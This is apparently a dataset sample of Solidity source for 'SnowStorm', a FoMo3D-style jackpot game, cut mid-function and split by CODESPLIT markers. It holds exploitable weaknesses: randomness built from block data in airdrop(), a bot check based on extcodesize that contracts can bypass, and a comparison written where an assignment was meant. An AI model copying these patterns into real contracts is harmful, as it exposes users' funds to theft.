pIDxName_[_affCode];                         if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                 _team = verifyTeam(_team);                 reLoadCore(_pID, _affID, _team, _eth, _eventData_);    }         function withdraw()        isActivated()        isHuman()        public    {                 uint256 _rID = rID_;                 uint256 _now = now;                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _eth;                 if (_now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)        {                         F3Ddatasets.EventReturns memory _eventData_;             			round_[_rID].ended = true;            _eventData_ = endRound(_eventData_);			             _eth = withdrawEarnings(_pID);                         if (_eth > 0)                plyr_[_pID].addr.transfer(_eth);                         _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                         emit F3Devents.onWithdrawAndDistribute            (                msg.sender,                plyr_[_pID].name,                _eth,                _eventData_.compressedData,                _eventData_.compressedIDs,                _eventData_.winnerAddr,                _eventData_.winnerName,                _eventData_.amountWon,                _eventData_.newPot,                _eventData_.P3DAmount,                _eventData_.genAmount            );                 } else {                         _eth = withdrawEarnings(_pID);                         if (_eth > 0)                plyr_[_pID].addr.transfer(_eth);                         emit F3Devents.onWithdraw(_pID, msg.sender, plyr_[_pID].name, _eth, _now);        }    }         function registerNameXID(string _nameString, uint256 _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXIDFromDapp.value(_paid)(_addr, _name, _affCode, _all);        uint256 _pID = pIDxAddr_[_addr];                 emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }    function registerNameXaddr(string _nameString, address _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXaddrFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);        uint256 _pID = pIDxAddr_[_addr];                 emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }    function registerNameXname(string _nameString, bytes32 _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXnameFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);        uint256 _pID = pIDxAddr_[_addr];                 emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }             function getBuyPrice()        public        view        returns(uint256)    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].keys.add(1000000000000000000)).ethRec(1000000000000000000) );        else              return ( 75000000000000 );      }         function getTimeLeft()        public        view        returns(uint256)    {                 uint256 _rID = rID_;                 uint256 _now = now;        if (_now < round_[_rID].end)            if (_now > round_[_rID].strt + rndGap_)                return( (round_[_rID].end).sub(_now) );            else                return( (round_[_rID].strt + rndGap_).sub(_now) );        else            return(0);    }         function getPlayerVaults(uint256 _pID)        public        view        returns(uint256 ,uint256, uint256)    {                 uint256 _rID = rID_;                 if (now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)        {                         if (round_[_rID].plyr == _pID)            {                return                (                    (plyr_[_pID].win).add( ((round_[_rID].pot).mul(48)) / 100 ),                    (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)   ),                    plyr_[_pID].aff                );                         } else {                return                (                    plyr_[_pID].win,                    (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)  ),                    plyr_[_pID].aff                );            }                 } else {            return            (                plyr_[_pID].win,                (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),                plyr_[_pID].aff            );        }    }         function getPlayerVaultsHelper(uint256 _pID, uint256 _rID)        private        view        returns(uint256)    {        return(  ((((round_[_rID].mask).add(((((round_[_rID].pot).mul(potSplit_[round_[_rID].team].gen)) / 100).mul(1000000000000000000)) / (round_[_rID].keys))).mul(plyrRnds_[_pID][_rID].keys)) / 1000000000000000000)  );    }         function getCurrentRoundInfo()        public        view        returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256, address, bytes32, uint256, uint256, uint256, uint256, uint256)    {                 uint256 _rID = rID_;        return        (            round_[_rID].ico,                            _rID,                                        round_[_rID].keys,                           round_[_rID].end,                            round_[_rID].strt,                           round_[_rID].pot,                            (round_[_rID].team + (round_[_rID].plyr * 10)),                  plyr_[round_[_rID].plyr].addr,               plyr_[round_[_rID].plyr].name,               rndTmEth_[_rID][0],                          rndTmEth_[_rID][1],                          rndTmEth_[_rID][2],                          rndTmEth_[_rID][3],                          airDropTracker_ + (airDropPot_ * 1000)                       );    }         function getPlayerInfoByAddress(address _addr)        public        view        returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256)    {                 uint256 _rID = rID_;        if (_addr == address(0))        {            _addr == msg.sender;        }        uint256 _pID = pIDxAddr_[_addr];        return        (            _pID,                                            plyr_[_pID].name,                                plyrRnds_[_pID][_rID].keys,                      plyr_[_pID].win,                                 (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),                    plyr_[_pID].aff,                                 plyrRnds_[_pID][_rID].eth                    );    }             function buyCore(uint256 _pID, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))        {                         core(_rID, _pID, msg.value, _affID, _team, _eventData_);                 } else {                         if (_now > round_[_rID].end && round_[_rID].ended == false)            {                 			    round_[_rID].ended = true;                _eventData_ = endRound(_eventData_);                                 _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);                _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                                 emit F3Devents.onBuyAndDistribute                (                    msg.sender,                    plyr_[_pID].name,                    msg.value,                    _eventData_.compressedData,                    _eventData_.compressedIDs,                    _eventData_.winnerAddr,                    _eventData_.winnerName,                    _eventData_.amountWon,                    _eventData_.newPot,                    _eventData_.P3DAmount,                    _eventData_.genAmount                );            }                         plyr_[_pID].gen = plyr_[_pID].gen.add(msg.value);        }    }         function reLoadCore(uint256 _pID, uint256 _affID, uint256 _team, uint256 _eth, F3Ddatasets.EventReturns memory _eventData_)        private    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))        {                                                   plyr_[_pID].gen = withdrawEarnings(_pID).sub(_eth);                         core(_rID, _pID, _eth, _affID, _team, _eventData_);                 } else if (_now > round_[_rID].end && round_[_rID].ended == false) {                         round_[_rID].ended = true;            _eventData_ = endRound(_eventData_);                         _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                         emit F3Devents.onReLoadAndDistribute            (                msg.sender,                plyr_[_pID].name,                _eventData_.compressedData,                _eventData_.compressedIDs,                _eventData_.winnerAddr,                _eventData_.winnerName,                _eventData_.amountWon,                _eventData_.newPot,                _eventData_.P3DAmount,                _eventData_.genAmount            );        }    }         function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private    {                 if (plyrRnds_[_pID][_rID].keys == 0)            _eventData_ = managePlayer(_pID, _eventData_);                 if (round_[_rID].eth < 100000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 1000000000000000000)        {            uint256 _availableLimit = (1000000000000000000).sub(plyrRnds_[_pID][_rID].eth);            uint256 _refund = _eth.sub(_availableLimit);            plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);            _eth = _availableLimit;        }                 if (_eth > 1000000000)        {                         uint256 _keys = (round_[_rID].eth).keysRec(_eth);                         if (_keys >= 1000000000000000000)            {            updateTimer(_keys, _rID);                         if (round_[_rID].plyr != _pID)                round_[_rID].plyr = _pID;            if (round_[_rID].team != _team)                round_[_rID].team = _team;                         _eventData_.compressedData = _eventData_.compressedData + 100;             }                                           _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);                         plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);            plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);                         round_[_rID].keys = _keys.add(round_[_rID].keys);            round_[_rID].eth = _eth.add(round_[_rID].eth);            rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);                         _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);            _eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);             		    endTx(_pID, _team, _eth, _keys, _eventData_);        }    }             function calcUnMaskedEarnings(uint256 _pID, uint256 _rIDlast)        private        view        returns(uint256)    {        return(  (((round_[_rIDlast].mask).mul(plyrRnds_[_pID][_rIDlast].keys)) / (1000000000000000000)).sub(plyrRnds_[_pID][_rIDlast].mask)  );    }         function calcKeysReceived(uint256 _rID, uint256 _eth)        public        view        returns(uint256)    {                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].eth).keysRec(_eth) );        else              return ( (_eth).keys() );    }         function iWantXKeys(uint256 _keys)        public        view        returns(uint256)    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].keys.add(_keys)).ethRec(_keys) );        else              return ( (_keys).eth() );    }             function receivePlayerInfo(uint256 _pID, address _addr, bytes32 _name, uint256 _laff)        external    {        require (msg.sender == address(PlayerBook), "your not playerNames contract... hmmm..");        if (pIDxAddr_[_addr] != _pID)            pIDxAddr_[_addr] = _pID;        if (pIDxName_[_name] != _pID)            pIDxName_[_name] = _pID;        if (plyr_[_pID].addr != _addr)            plyr_[_pID].addr = _addr;        if (plyr_[_pID].name != _name)            plyr_[_pID].name = _name;        if (plyr_[_pID].laff != _laff)            plyr_[_pID].laff = _laff;        if (plyrNames_[_pID][_name] == false)            plyrNames_[_pID][_name] = true;    }         function receivePlayerNameList(uint256 _pID, bytes32 _name)        external    {        require (msg.sender == address(PlayerBook), "your not playerNames contract... hmmm..");        if(plyrNames_[_pID][_name] == false)            plyrNames_[_pID][_name] = true;    }         function determinePID(F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {        uint256 _pID = pIDxAddr_[msg.sender];                 if (_pID == 0)        {                         _pID = PlayerBook.getPlayerID(msg.sender);            bytes32 _name = PlayerBook.getPlayerName(_pID);            uint256 _laff = PlayerBook.getPlayerLAff(_pID);                         pIDxAddr_[msg.sender] = _pID;            plyr_[_pID].addr = msg.sender;            if (_name != "")            {                pIDxName_[_name] = _pID;                plyr_[_pID].name = _name;                plyrNames_[_pID][_name] = true;            }            if (_laff != 0 && _laff != _pID)                plyr_[_pID].laff = _laff;                         _eventData_.compressedData = _eventData_.compressedData + 1;        }        return (_eventData_);    }         function verifyTeam(uint256 _team)        private        pure        returns (uint256)    {        if (_team < 0 || _team > 3)            return(2);        else            return(_team);    }         function managePlayer(uint256 _pID, F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {                          if (plyr_[_pID].lrnd != 0)            updateGenVault(_pID, plyr_[_pID].lrnd);                 plyr_[_pID].lrnd = rID_;                 _eventData_.compressedData = _eventData_.compressedData + 10;        return(_eventData_);    }         function endRound(F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {                 uint256 _rID = rID_;                 uint256 _winPID = round_[_rID].plyr;        uint256 _winTID = round_[_rID].team;                 uint256 _pot = round_[_rID].pot;                          uint256 _win = (_pot.mul(48)) / 100;        uint256 _com = (_pot / 50);        uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;        uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100;        uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d);                 uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);        uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);        if (_dust > 0)        {            _gen = _gen.sub(_dust);            _res = _res.add(_dust);        }                 plyr_[_winPID].win = _win.add(plyr_[_winPID].win);                 admin.transfer(_com);        admin.transfer(_p3d.sub(_p3d / 2));        round_[_rID].pot = _pot.add(_p3d / 2);                 round_[_rID].mask = _ppt.add(round_[_rID].mask);                 _eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);        _eventData_.winnerAddr = plyr_[_winPID].addr;        _eventData_.winnerName = plyr_[_winPID].name;        _eventData_.amountWon = _win;        _eventData_.genAmount = _gen;        _eventData_.P3DAmount = _p3d;        _eventData_.newPot = _res;                 rID_++;        _rID++;        round_[_rID].strt = now;        round_[_rID].end = now.add(rndInit_).add(rndGap_);        round_[_rID].pot = _res;        return(_eventData_);    }         function updateGenVault(uint256 _pID, uint256 _rIDlast)        private    {        uint256 _earnings = calcUnMaskedEarnings(_pID, _rIDlast);        if (_earnings > 0)        {                         plyr_[_pID].gen = _earnings.add(plyr_[_pID].gen);                         plyrRnds_[_pID][_rIDlast].mask = _earnings.add(plyrRnds_[_pID][_rIDlast].mask);        }    }         function updateTimer(uint256 _keys, uint256 _rID)        private    {                 uint256 _now = now;                 uint256 _newTime;        if (_now > round_[_rID].end && round_[_rID].plyr == 0)            _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(_now);        else            _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(round_[_rID].end);                 if (_newTime < (rndMax_).add(_now))            round_[_rID].end = _newTime;        else            round_[_rID].end = rndMax_.add(_now);    }         function airdrop()        private        view        returns(bool)    {        uint256 seed = uint256(keccak256(abi.encodePacked(            (block.timestamp).add            (block.difficulty).add            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add            (block.gaslimit).add            ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add            (block.number)        )));        if((seed - ((seed / 1000) * 1000)) < airDropTracker_)            return(true);        else            return(false);    }         function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private        returns(F3Ddatasets.EventReturns)    {                 uint256 _p1 = _eth / 100;        uint256 _com = _eth / 50;        _com = _com.add(_p1);        uint256 _p3d;        if (!address(admin).call.value(_com)())        {                                                                                          _p3d = _com;            _com = 0;        }                 uint256 _aff = _eth / 10;                          if (_affID != _pID && plyr_[_affID].name != '') {            plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);            emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);        } else {            _p3d = _aff;        }                 _p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));        if (_p3d > 0)        {                         uint256 _potAmount = _p3d / 2;            admin.transfer(_p3d.sub(_potAmount));            round_[_rID].pot = round_[_rID].pot.add(_potAmount);                         _eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);        }        return(_eventData_);    }    function potSwap()        external        payable    {                 uint256 _rID = rID_ + 1;        round_[_rID].pot = round_[_rID].pot.add(msg.value);        emit F3Devents.onPotSwapDeposit(_rID, msg.value);    }         function distributeInternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _team, uint256 _keys, F3Ddatasets.EventReturns memory _eventData_)        private        returns(F3Ddatasets.EventReturns)    {                 uint256 _gen = (_eth.mul(fees_[_team].gen)) / 100;                 uint256 _air = (_eth / 100);        airDropPot_ = airDropPot_.add(_air);                 _eth = _eth.sub(((_eth.mul(14)) / 100).add((_eth.mul(fees_[_team].p3d)) / 100));                 uint256 _pot = _eth.sub(_gen);                          uint256 _dust = updateMasks(_rID, _pID, _gen, _keys);        if (_dust > 0)            _gen = _gen.sub(_dust);                 round_[_rID].pot = _pot.add(_dust).add(round_[_rID].pot);                 _eventData_.genAmount = _gen.add(_eventData_.genAmount);        _eventData_.potAmount = _pot;        return(_eventData_);    }         function updateMasks(uint256 _rID, uint256 _pID, uint256 _gen, uint256 _keys)        private        returns(uint256)    {                          uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);        round_[_rID].mask = _ppt.add(round_[_rID].mask);                          uint256 _pearn = (_ppt.mul(_keys)) / (1000000000000000000);        plyrRnds_[_pID][_rID].mask = (((round_[_rID].mask.mul(_keys)) / (1000000000000000000)).sub(_pearn)).add(plyrRnds_[_pID][_rID].mask);                 return(_gen.sub((_ppt.mul(round_[_rID].keys)) / (1000000000000000000)));    }         function withdrawEarnings(uint256 _pID)        private        returns(uint256)    {                 updateGenVault(_pID, plyr_[_pID].lrnd);                 uint256 _earnings = (plyr_[_pID].win).add(plyr_[_pID].gen).add(plyr_[_pID].aff);        if (_earnings > 0)        {            plyr_[_pID].win = 0;            plyr_[_pID].gen = 0;            plyr_[_pID].aff = 0;        }        return(_earnings);    }         function endTx(uint256 _pID, uint256 _team, uint256 _eth, uint256 _keys, F3Ddatasets.EventReturns memory _eventData_)        private    {        _eventData_.compressedData = _eventData_.compressedData + (now * 1000000000000000000) + (_team * 100000000000000000000000000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + _pID + (rID_ * 10000000000000000000000000000000000000000000000000000);        emit F3Devents.onEndTx        (            _eventData_.compressedData,            _eventData_.compressedIDs,            plyr_[_pID].name,            msg.sender,            _eth,            _keys,            _eventData_.winnerAddr,            _eventData_.winnerName,            _eventData_.amountWon,            _eventData_.newPot,            _eventData_.P3DAmount,            _eventData_.genAmount,            _eventData_.potAmount,            airDropPot_        );    }             bool public activated_ = false;    function activate()        public    {                 require(msg.sender == admin, "only admin can activate");                 require(activated_ == false, "FOMO Short already activated");                 activated_ = true;                 rID_ = 1;            round_[1].strt = now + rndExtra_ - rndGap_;            round_[1].end = now + rndInit_ + rndExtra_;    }}    library F3Ddatasets {                                                                                                                                                               struct EventReturns {        uint256 compressedData;        uint256 compressedIDs;        address winnerAddr;                  bytes32 winnerName;                  uint256 amountWon;                   uint256 newPot;                      uint256 P3DAmount;                   uint256 genAmount;                   uint256 potAmount;               }    struct Player {        address addr;            bytes32 name;            uint256 win;             uint256 gen;             uint256 aff;             uint256 lrnd;            uint256 laff;        }    struct PlayerRounds {        uint256 eth;             uint256 keys;            uint256 mask;            uint256 ico;         }    struct Round {        uint256 plyr;            uint256 team;            uint256 end;             bool ended;              uint256 strt;            uint256 keys;            uint256 eth;             uint256 pot;             uint256 mask;            uint256 ico;             uint256 icoGen;          uint256 icoAvg;      }    struct TeamFee {        uint256 gen;             uint256 p3d;         }    struct PotSplit {        uint256 gen;             uint256 p3d;         }}    library F3DKeysCalcShort {    using SafeMath for *;         function keysRec(uint256 _curEth, uint256 _newEth)        internal        pure        returns (uint256)    {        return(keys((_curEth).add(_newEth)).sub(keys(_curEth)));    }         function ethRec(uint256 _curKeys, uint256 _sellKeys)        internal        pure        returns (uint256)    {        return((eth(_curKeys)).sub(eth(_curKeys.sub(_sellKeys))));    }         function keys(uint256 _eth)        internal        pure        returns(uint256)    {        return ((((((_eth).mul(1000000000000000000)).mul(312500000000000000000000000)).add(5624988281256103515625000000000000000000000000000000000000000000)).sqrt()).sub(74999921875000000000000000000000)) / (156250000);    }         function eth(uint256 _keys)        internal        pure        returns(uint256)    {        return ((78125000).mul(_keys.sq()).add(((149999843750000).mul(_keys.mul(1000000000000000000))) / (2))) / ((1000000000000000000).sq());    }}    interface PlayerBookInterface {    function getPlayerID(address _addr) external returns (uint256);    function getPlayerName(uint256 _pID) external view returns (bytes32);    function getPlayerLAff(uint256 _pID) external view returns (uint256);    function getPlayerAddr(uint256 _pID) external view returns (address);    function getNameFee() external view returns (uint256);    function registerNameXIDFromDapp(address _addr, bytes32 _name, uint256 _affCode, bool _all) external payable returns(bool, uint256);    function registerNameXaddrFromDapp(address _addr, bytes32 _name, address _affCode, bool _all) external payable returns(bool, uint256);    function registerNameXnameFromDapp(address _addr, bytes32 _name, bytes32 _affCode, bool _all) external payable returns(bool, uint256);} library NameFilter {         function nameFilter(string _input)        internal        pure        returns(bytes32)    {        bytes memory _temp = bytes(_input);        uint256 _length = _temp.length;                 require (_length <= 32 && _length > 0, "string must be between 1 and 32 characters");                 require(_temp[0] != 0x20 && _temp[_length-1] != 0x20, "string cannot start or end with space");                 if (_temp[0] == 0x30)        {            require(_temp[1] != 0x78, "string cannot start with 0x");            require(_temp[1] != 0x58, "string cannot start with 0X");        }                 bool _hasNonNumber;                 for (uint256 i = 0; i < _length; i++)        {                         if (_temp[i] > 0x40 && _temp[i] < 0x5b)            {                                 _temp[i] = byte(uint(_temp[i]) + 32);                                 if (_hasNonNumber == false)                    _hasNonNumber = true;            } else {                require                (                                         _temp[i] == 0x20 ||                                         (_temp[i] > 0x60 && _temp[i] < 0x7b) ||                                         (_temp[i] > 0x2f && _temp[i] < 0x3a),                    "string contains invalid characters"                );                                 if (_temp[i] == 0x20)                    require( _temp[i+1] != 0x20, "string cannot contain consecutive spaces");                                 if (_hasNonNumber == false && (_temp[i] < 0x30 || _temp[i] > 0x39))                    _hasNonNumber = true;            }        }        require(_hasNonNumber == true, "string cannot be only numbers");        bytes32 _ret;        assembly {            _ret := mload(add(_temp, 32))        }        return (_ret);    }} library SafeMath {         function mul(uint256 a, uint256 b)        internal        pure        returns (uint256 c)    {        if (a == 0) {            return 0;        }        c = a * b;        require(c / a == b, "SafeMath mul failed");        return c;    }         function sub(uint256 a, uint256 b)        internal        pure        returns (uint256)    {        require(b <= a, "SafeMath sub failed");        return a - b;    }         function add(uint256 a, uint256 b)        internal        pure        returns (uint256 c)    {        c = a + b;        require(c >= a, "SafeMath add failed");        return c;    }         function sqrt(uint256 x)        internal        pure        returns (uint256 y)    {        uint256 z = ((add(x,1)) / 2);        y = x;        while (z < y)        {            y = z;            z = ((add((x / z),z)) / 2);        }    }         function sq(uint256 x)        internal        pure        returns (uint256)    {        return (mul(x,x));    }         function pwr(uint256 x, uint256 y)        internal        pure        returns (uint256)    {        if (x==0)            return (0);        else if (y==0)            return (1);        else        {            uint256 z = x;            for (uint256 i=1; i < y; i++)                z = mul(z,x);            return (z);        }    }}
0<CODESPLIT>contract Snow {    function buy(address) public payable returns(uint256);    function withdraw() public;    function redistribution() external payable;    function myTokens() public view returns(uint256);    function myDividends(bool) public view returns(uint256);}
0<CODESPLIT>contract SnowStorm is modularShort {    using SafeMath for *;    using NameFilter for string;    using F3DKeysCalcShort for uint256;    PlayerBookInterface constant private PlayerBook = PlayerBookInterface(0xf4FBEF849bcf02Ac4b305c2bc092FC270a14124C);    address private admin = msg.sender;    string constant public name = "SnowStorm";    string constant public symbol = "SS";    uint256 private rndExtra_ = 1 seconds;    uint256 private rndGap_ = 1 seconds;    uint256 constant private rndInit_ = 8 hours;    uint256 constant private rndInc_ = 30 seconds;    uint256 constant private rndMax_ = 8 hours;    address treat;    Snow action;    uint256 public airDropPot_;                  uint256 public airDropTracker_ = 0;          uint256 public rID_;            mapping (address => uint256) public pIDxAddr_;               mapping (bytes32 => uint256) public pIDxName_;               mapping (uint256 => F3Ddatasets.Player) public plyr_;        mapping (uint256 => mapping (uint256 => F3Ddatasets.PlayerRounds)) public plyrRnds_;         mapping (uint256 => mapping (bytes32 => bool)) public plyrNames_;         mapping (uint256 => F3Ddatasets.Round) public round_;        mapping (uint256 => mapping(uint256 => uint256)) public rndTmEth_;              mapping (uint256 => F3Ddatasets.TeamFee) public fees_;               mapping (uint256 => F3Ddatasets.PotSplit) public potSplit_;              constructor()        public    {           treat = 0x371308b6A7B6f80DF798589c48Dea369839951dd;          action = Snow(treat);		                                     		                           fees_[0] = F3Ddatasets.TeamFee(46,10);            fees_[1] = F3Ddatasets.TeamFee(46,10);            fees_[2] = F3Ddatasets.TeamFee(46,10);            fees_[3] = F3Ddatasets.TeamFee(46,10);                              potSplit_[0] = F3Ddatasets.PotSplit(35,5);           potSplit_[1] = F3Ddatasets.PotSplit(35,5);           potSplit_[2] = F3Ddatasets.PotSplit(35,5);           potSplit_[3] = F3Ddatasets.PotSplit(35,5);       }             modifier isActivated() {        require(activated_ == true, "its not ready yet.  check ?eta in discord");        _;    }         modifier isHuman() {        address _addr = msg.sender;        uint256 _codeLength;        assembly {_codeLength := extcodesize(_addr)}        require(_codeLength == 0, "sorry humans only");        _;    }         modifier isWithinLimits(uint256 _eth) {        require(_eth >= 1000000000, "pocket lint: not a valid currency");        require(_eth <= 100000000000000000000000, "no vitalik, no");        _;    }             function()        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                 buyCore(_pID, plyr_[_pID].laff, 2, _eventData_);    }         function buyXid(uint256 _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                          if (_affCode == 0 || _affCode == _pID)        {                         _affCode = plyr_[_pID].laff;                 } else if (_affCode != plyr_[_pID].laff) {                         plyr_[_pID].laff = _affCode;        }                 _team = verifyTeam(_team);                 buyCore(_pID, _affCode, _team, _eventData_);    }    function buyXaddr(address _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID;                 if (_affCode == address(0) || _affCode == msg.sender)        {                         _affID = plyr_[_pID].laff;                 } else {                         _affID = pIDxAddr_[_affCode];                         if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                 _team = verifyTeam(_team);                 buyCore(_pID, _affID, _team, _eventData_);    }    function buyXname(bytes32 _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID;                 if (_affCode == '' || _affCode == plyr_[_pID].name)        {                         _affID = plyr_[_pID].laff;                 } else {                         _affID = pIDxName_[_affCode];                         if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                 _team = verifyTeam(_team);                 buyCore(_pID, _affID, _team, _eventData_);    }         function reLoadXid(uint256 _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 F3Ddatasets.EventReturns memory _eventData_;                 uint256 _pID = pIDxAddr_[msg.sender];                          if (_affCode == 0 || _affCode == _pID)        {                         _affCode = plyr_[_pID].laff;                 } else if (_affCode != plyr_[_pID].laff) {                         plyr_[_pID].laff = _affCode;        }                 _team = verifyTeam(_team);                 reLoadCore(_pID, _affCode, _team, _eth, _eventData_);    }    function reLoadXaddr(address _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 F3Ddatasets.EventReturns memory _eventData_;                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID;                 if (_affCode == address(0) || _affCode == msg.sender)        {                         _affID = plyr_[_pID].laff;                 } else {                         _affID = pIDxAddr_[_affCode];                         if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                 _team = verifyTeam(_team);                 reLoadCore(_pID, _affID, _team, _eth, _eventData_);    }    function reLoadXname(bytes32 _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 F3Ddatasets.EventReturns memory _eventData_;                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID;                 if (_affCode == '' || _affCode == plyr_[_pID].name)        {                         _affID = plyr_[_pID].laff;                 } else {                         _affID = pIDxName_[_affCode];                         if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                 _team = verifyTeam(_team);                 reLoadCore(_pID, _affID, _team, _eth, _eventData_);    }         function withdraw()        isActivated()        isHuman()        public    {                 uint256 _rID = rID_;                 uint256 _now = now;                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _eth;                 if (_now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)        {                         F3Ddatasets.EventReturns memory _eventData_;             			round_[_rID].ended = true;            _eventData_ = endRound(_eventData_);			             _eth = withdrawEarnings(_pID);                         if (_eth > 0)                plyr_[_pID].addr.transfer(_eth);                         _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                         emit F3Devents.onWithdrawAndDistribute            (                msg.sender,                plyr_[_pID].name,                _eth,                _eventData_.compressedData,                _eventData_.compressedIDs,                